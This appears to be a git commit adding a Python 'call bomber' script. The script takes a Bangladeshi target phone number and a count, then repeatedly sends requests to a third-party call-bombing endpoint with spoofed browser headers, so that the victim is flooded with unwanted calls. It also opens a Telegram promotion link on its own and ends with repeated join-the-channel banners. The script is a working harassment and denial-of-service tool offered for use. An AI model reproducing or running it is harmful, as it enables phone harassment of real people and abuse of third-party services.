275b6b2ff0af6267a641527ace9ac6c263e5f909
MUEOR COMMAND WORLD <124854455+Suggestol@users.noreply.github.com>
2023-09-26 22:14:47 +0600

    Add files via upload
    Must join our telegram chanel
    
    Link t.me/mueorb

---
+++ followformore.py
@@ -0,0 +1,94 @@
+#hello
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://t.me/mueorb")
+logo3=("""
+\33[38;5;196m██████╗ ██╗  ██╗██╗  ██╗██╗██████╗\33[38;5;196m 
+\33[38;5;196m██╔══██╗██║  ██║██║ ██╔╝██║██╔══██╗\33[38;5;196m
+\33[38;5;196m██████╔╝███████║█████╔╝ ██║██████╔╝\33[38;5;196m
+\33[38;5;196m██╔══██╗╚════██║██╔═██╗ ██║██╔══██╗\33[38;5;196m
+\33[38;5;196m██║  ██║     ██║██║  ██╗██║██████╔╝\33[38;5;196m
+\33[38;5;196m╚═╝  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝    \33[38;5;196m
+\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mıllıllı⭐🌟 R4KIB 🌟⭐ıllıllı\33[38;5;196m━━━━━━━━━━━━━
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]rakib\33[38;5;196m                                        ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]rakib\33[38;5;196m                                  ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]mueor\33[38;5;196m                                    ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m             ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]Nai\33[38;5;196m                                    ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\33[38;5;196m  : [★]CALL BOMBER\33[38;5;196m   ┃
+\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\33[38;5;196m: [★]𝗣𝗥𝗘𝗠𝗜𝗨𝗠-𝗩01\33[38;5;196m            ┃
+ \33[38;5;196m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝙁𝙄𝙍𝙀\33[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mCALL BOMBINg AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://khalid10.xyz/Call-Bomb/ax-callbomb?UserName=6c676aa80961edebdc05b9472c72067a&Request/Call/To/Phone/AX=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+url2="https://khalid10.xyz/Call-Bomb/ax-callbomb?UserName=6c676aa80961edebdc05b9472c72067a&Request/Call/To/Phone/AX=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers2={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46mMUEOR TERMUX WORLD")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mMUEOR TERMUX WORLD")
+  else:
+    pass
+  
+  sent3=requests.get(url2,headers=headers2)
+  if sent3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mMUEOR TERMUX WORLD")
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+JOIN TELEGRAM 
+    t.me/mueorb
+                     t.me/mueorb
+                            t.me/mueorb
+                            t.me/mueorb
+                            t.me/mueorb
+                            t.me/mueorb
+                            t.me/mueorb
+                            
+ JOIN TELEGRAM🖤
+""")
